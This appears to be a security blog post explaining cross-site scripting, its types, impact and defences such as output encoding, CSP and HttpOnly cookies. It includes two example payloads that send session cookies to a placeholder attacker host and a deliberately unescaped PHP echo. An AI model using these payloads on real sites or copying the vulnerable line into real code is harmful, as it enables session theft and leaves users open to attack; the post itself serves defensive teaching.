---
layout: ../../../layouts/PostLayout.astro
title: "Cross-Site Scripting (XSS): The Classic That Never Gets Old"
description: "Understand what XSS is, how it works in practice, its real-world impact, and how to write code that isn't vulnerable to this type of attack."
date: "2024-06-10"
category: "Vulnerabilities"
lang: "en-US"
---

## What is XSS?

**Cross-Site Scripting (XSS)** is a class of vulnerability that allows an attacker to inject malicious scripts into web pages viewed by other users. Despite having "Cross-Site" in its name, the essence of the attack is the *injection of JavaScript code* into contexts where the application should be displaying only data.

XSS occurs when a web application:

1. Receives data from an untrusted source (URL parameter, form input, cookie, etc.)
2. Includes that data in the HTML response **without proper sanitization**
3. The victim's browser interprets and executes the injected code

---

## Main Types

### Reflected XSS

The payload is sent via an HTTP request and immediately reflected back in the response. The victim must be tricked into clicking a malicious link.

```
https://target.com/search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
```

### Stored XSS

The payload is stored in the server's database (comment, profile, message) and displayed to other users. This is the most dangerous type: without requiring a special link, any visit to the page executes the code.

### DOM-based XSS

The vulnerability exists in the client-side JavaScript itself. The DOM is manipulated without the payload passing through the server — attacks that bypass WAFs configured only on the server side.

---

## Conceptual Example

Imagine a search field that displays the searched string:

```html
<!-- Vulnerable code -->
<p>You searched for: <?= $_GET['q'] ?></p>
```

A malicious user accesses:

```
/search?q=<img src=x onerror="fetch('https://evil.com/?s='+document.cookie)">
```

The result rendered in the victim's HTML will be an invalid image that, upon failing to load, executes the code — silently exfiltrating session cookies.

---

## Real-World Impact

XSS is not just "displaying an alert() on screen." With JavaScript executing in the context of the target origin, an attacker can:

- **Steal sessions**: capture cookies and authentication tokens
- **Keylogging**: record everything the user types on the page
- **Defacement**: alter the visual content of the page in real time
- **Redirection**: send the victim to phishing pages
- **Chained CSRF**: perform authenticated requests on behalf of the victim
- **Data exfiltration**: read DOM content and send it to an external server

> In financial, medical, or government applications, a stored XSS vulnerability can compromise hundreds of thousands of users simultaneously.

---

## How to Prevent

Effective prevention requires defense in depth:

**1. Contextual output encoding**

Encode data before inserting it into HTML. Use the correct function for each context:

- HTML body → `htmlspecialchars()` (PHP) / `escapeHtml()`
- HTML attribute → `htmlspecialchars($val, ENT_QUOTES)`
- JavaScript → `JSON.encode()` or dedicated escape functions
- URL → `urlencode()`

**2. Content Security Policy (CSP)**

Implement a restrictive CSP via HTTP header to limit allowed script origins:

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{RANDOM}';
```

**3. Cookie Flags**

Protect session cookies with `HttpOnly` (inaccessible via JS) and `Secure` (HTTPS only):

```
Set-Cookie: sessid=abc123; HttpOnly; Secure; SameSite=Strict
```

**4. Input validation**

Validate and reject inputs that don't match the expected format. Whitelist is preferable to blacklist.

**5. Modern frameworks**

React, Vue, and Angular perform automatic encoding by default. Never use `dangerouslySetInnerHTML`, `v-html`, or `innerHTML` with untrusted data.

---

## Further Reading

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger Web Security Academy — XSS](https://portswigger.net/web-security/cross-site-scripting)
- CWE-79: Improper Neutralization of Input During Web Page Generation
